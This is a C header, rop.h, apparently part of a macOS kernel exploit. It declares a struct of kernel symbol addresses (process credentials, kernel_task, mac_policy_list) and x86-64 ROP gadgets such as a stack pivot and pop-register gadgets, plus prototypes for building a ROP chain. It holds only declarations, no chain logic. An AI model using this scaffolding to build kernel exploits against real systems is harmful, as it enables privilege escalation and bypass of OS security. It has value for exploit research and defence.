#ifndef ROP_H
#define ROP_H

#include <stdint.h>             // uint32_t, uint64_t

typedef struct
{
    uint64_t image1Size;
    uint64_t imageSize;
    uint32_t image1Pages;
    uint32_t imagePages;
    uint32_t booterStart;
    uint32_t smcStart;
    uint32_t booterDuration;
    uint32_t booterConnectDisplayDuration;
    uint32_t booterSplashDuration;
    uint32_t booterDuration0;
    uint32_t booterDuration1;
    uint32_t booterDuration2;
    uint32_t trampolineDuration;
    uint32_t kernelImageReadDuration;

    uint32_t graphicsReadyTime;
    uint32_t wakeNotificationTime;
    uint32_t lockScreenReadyTime;
    uint32_t hidReadyTime;

    uint32_t wakeCapability;
    uint32_t resvA[15];
} hibernate_statistics_t;

typedef struct
{
    // slid
    uint64_t OSObject_vtab;
    uint64_t OSObject_taggedRelease;
    uint64_t OSSerializer_serialize;
    uint64_t OSArray_initWithArray;
    uint64_t kOSBooleanTrue;
    uint64_t current_proc;
    uint64_t proc_ucred;
    uint64_t posix_cred_get;
    uint64_t bzero;
    uint64_t memcpy;
    uint64_t PE_current_console;
    uint64_t mach_vm_remap;
    uint64_t mach_vm_wire;
    uint64_t ipc_port_alloc_special;
    uint64_t ipc_port_make_send;
    uint64_t ipc_kobject_set;
    uint64_t ipc_space_kernel;
    uint64_t kernel_task;
    uint64_t kernel_map;
    uint64_t zone_map;
    uint64_t realhost;
    uint64_t mac_policy_list;
    uint64_t IOLockAlloc;
    uint64_t lck_mtx_lock;
    uint64_t IOHibernateIOKitSleep;
    uint64_t hibernate_machine_init;
    uint64_t _hibernateStats;
    uint64_t _gFSLock;
    uint64_t memcpy_gadget;
    uint64_t jmp__vtab1_;
    uint64_t mov_rsi_r15_call__vtab0_;
    uint64_t stack_pivot;
    uint64_t mov_rsp_rsi_call_rdi;
    uint64_t add_rsp_0x20_pop_rbp;
    uint64_t pop_rax;
    uint64_t pop_rdi;
    uint64_t pop_rsi;
    uint64_t pop_rdx;
    uint64_t pop_rcx;
    uint64_t pop_r8_pop_rbp;
    uint64_t mov_r9__rbp_X__call_rax;
    uint64_t push_rbp_mov_rax__rdi__pop_rbp;
    uint64_t mov_rax__rdi__pop_rbp;
    uint64_t mov__rdi__rax_pop_rbp;
    uint64_t mov_rdi_rax_pop_rbp_jmp_rcx;
    uint64_t mov_rsi_rax_pop_rbp_jmp_rcx;
    uint64_t mov_rdx_rax_pop_rbp_jmp_rcx;
    uint64_t sub_rax_rdi_pop_rbp;

    // unslid
    uint64_t taggedRelease_vtab_offset;
    uint64_t OSArray_array_offset;
    uint64_t stack_pivot_load_off;
    uint64_t stack_pivot_call_off;
    uint64_t mov_r9__rbp_X__off;
    uint64_t memcpy_gadget_imm;
} rop_t;

int rop_gadgets(rop_t *rop, void *kernel);

int rop_chain(rop_t *rop, uint64_t *buf, uint64_t addr);

#endif
